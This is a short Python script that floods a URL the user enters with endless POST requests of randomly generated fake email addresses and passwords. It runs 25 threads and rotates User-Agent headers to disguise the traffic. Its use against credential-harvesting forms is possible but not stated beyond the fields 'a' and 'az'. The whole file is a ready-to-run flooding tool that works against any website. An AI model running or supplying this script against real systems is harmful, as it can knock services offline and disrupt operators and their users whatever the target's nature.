import threading
import requests
import random
import string
import names
from emailHosts import email_domains

from fake_useragent import UserAgent


def name_gen():  # Generates a random name for the email
    name_system = random.choice(
        ["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"]
    )
    first_name = names.get_first_name()
    last_name = names.get_last_name()
    if name_system == "FullName":  # JohnDoe
        return first_name + last_name
    elif name_system == "FullFirstFirstInitial":  # JohnD
        return first_name + last_name[0]
    return first_name[0] + last_name  # JDoe


def generate_random_email():  # Generate email with combination of name and domain
    name = name_gen()
    NumberOrNo = random.choice(["Number", "No"])
    domain = random.choice(email_domains)  # 140+ domains
    if NumberOrNo == "Number":
        return name + str(random.randint(1, 100)) + domain
    else:
        return name + domain


def generate_random_password():  # Generate password using uppercase, lowercase, numbers and special characters
    characters = string.ascii_letters + string.digits + "@$!%^&*"
    length = random.randint(12, 20)  # Random length between 12 and 20
    return "".join(random.choice(characters) for _ in range(length))


def send_posts(url):
    while True:
        email = generate_random_email()
        password = generate_random_password()
        data = {"a": email, "az": password}
        ua = UserAgent()
        user_agent = ua.random
        headers = {"User-Agent": user_agent}
        response = requests.post(
            url,
            data=data,
            headers=headers,
        )
        print(
            f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}"
        )


def main():
    url = input("Enter the URL of the target you want to flood: ")
    threads = [
        threading.Thread(target=send_posts, args=(url,), daemon=True) for _ in range(25)
    ]

    for t in threads:
        t.start()

    for t in threads:
        t.join()


if __name__ == "__main__":
    main()
